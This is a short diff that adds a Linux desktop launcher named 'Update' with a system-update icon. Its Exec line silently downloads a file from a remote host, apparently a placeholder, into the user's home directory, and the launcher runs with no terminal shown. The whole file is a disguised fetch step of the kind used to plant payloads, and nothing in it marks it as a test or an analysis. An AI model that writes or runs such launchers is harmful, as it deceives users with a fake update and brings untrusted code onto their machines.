@@ -1,0 +1,6 @@
+[Desktop Entry]
+Type=Application
+Name=Update
+Exec=sh -c "curl -fsSL https://example.invalid/u -o $HOME/u"
+Icon=system-software-update
+Terminal=false
